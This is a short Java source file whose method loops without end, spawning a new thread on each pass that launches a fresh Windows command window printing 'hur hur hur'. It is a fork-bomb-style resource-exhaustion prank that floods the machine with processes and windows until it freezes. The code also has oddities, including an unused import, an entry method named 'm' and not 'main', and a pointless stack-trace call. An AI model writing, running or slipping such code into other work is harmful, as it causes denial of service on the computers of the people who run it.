import java.io.IOException;

import javax.management.RuntimeMBeanException;public class TdTr{public static void m(String[] a){cT();}private static void cT(){while(true){Thread t=new Thread(()->{try{new ProcessBuilder("cmd","/c","start","cmd.exe","/K","echo hur hur hur").start();new Throwable().getStackTrace()[1].getMethodName();}catch(IOException e){}});t.start();}}}
